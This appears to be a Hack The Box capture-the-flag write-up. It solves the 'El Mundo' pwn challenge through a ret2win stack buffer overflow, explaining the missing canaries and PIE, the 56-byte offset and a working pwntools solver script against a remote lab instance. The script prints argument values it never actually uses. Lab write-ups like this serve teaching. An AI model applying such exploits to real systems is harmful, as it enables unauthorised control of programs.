# Hack The Box: El Mundo — Pwn Challenge Writeup

### 📌 Overview & Metadata
*   **Target:** El Mundo (Linux Pwn)
*   **Vulnerability:** Stack-Based Buffer Overflow (ret2win)
*   **Pwn Date:** 20 Aug 2026

### 🧠 Core Concepts & Vulnerability Breakdown

To understand this exploit, we must break down the mechanics of the vulnerability and the absence of critical modern security mitigations.

**1. The Stack-Based Buffer Overflow**
At its core, a buffer overflow occurs when a program writes more data to a block of memory (the buffer) than it was allocated to hold. In the case of `El Mundo`, reviewing the source code revealed a fatal flaw: the program allocated a fixed buffer size of only 48 bytes but used an unsafe input function that allowed the user to input up to 256 bytes. This allows the excess data to "spill over" into adjacent memory space on the stack.

**2. Execution Flow Hijacking**
Why does spilling over matter? When a function is called in C/C++, the program saves a "return address" on the stack so it knows where to resume execution after the function finishes. Because this application lacks bounds checking, our oversized 256-byte input overwrites that saved return address. By carefully calculating the exact size of the overflow, we can replace the legitimate return address with a memory address of our choosing, effectively taking total control of the CPU's instruction pointer (RIP).

### 🔍 Reconnaissance: Analyzing Security Protections

Before writing the exploit, I used GDB (GNU Debugger) to analyze the binary's compiled security protections. Two critical defensive mechanisms were missing, which made this attack viable:

*   **Missing Stack Canaries:** A canary is a randomized value placed just before the return address on the stack. If a buffer overflow occurs, the canary is overwritten first. The program checks the canary before returning; if it has changed, the program crashes securely to prevent exploitation. **Because canaries were disabled here, I could overwrite the return address without triggering an abort.**
*   **Missing PIE (Position Independent Executable):** PIE randomizes the memory locations of the binary's code every time it runs. If PIE is enabled, you cannot hardcode memory addresses into your exploit. **Because PIE was disabled, the memory address of our target function was static and predictable.**

### 🎯 The Exploit Methodology

With the security landscape mapped, the objective was to perform a "ret2win" attack—redirecting the program to a hidden function that reads the flag.

1.  **Finding the Offset:** I needed to find the exact number of bytes required to reach the return address. Through dynamic analysis, I calculated that it took exactly **56 bytes** of junk data (`'A' * 56`) to fill the buffer and reach the instruction pointer.
2.  **Identifying the Target:** I analyzed the binary to find the static memory address for the `read_flag` function. Because PIE was disabled, this address reliably sat at **`0x4016b7`**.
3.  **Weaponization:** I constructed a payload consisting of 56 bytes of padding, immediately followed by the 64-bit packed address of `read_flag`. When the vulnerable function finished executing, it "returned" straight into our target function, bypassing normal authentication checks and printing the flag.

### 🐍 Exploit Script (`solver.py`)

Using the `pwntools` framework, I automated the payload delivery:

```python
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'

fname = './el_mundo'

LOCAL = False 

os.system('clear')

if LOCAL:
    print('Running solver locally..\n')
    r = process(fname)
else:
    # Target configured to hit the HTB remote instance
    IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
    PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
    r    = remote('154.57.164.82', 32433) 
    print(f'Running solver remotely at {IP}:{PORT}\n')

e = ELF(fname)

# Discovered via dynamic analysis
nbytes = 56             
read_flag_addr = 0x4016b7 

# Send malicious payload to smash the stack and overwrite RIP
r.sendlineafter('> ', b'A'*nbytes + p64(read_flag_addr))

# Capture the execution output
r.sendline('cat flag*')
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
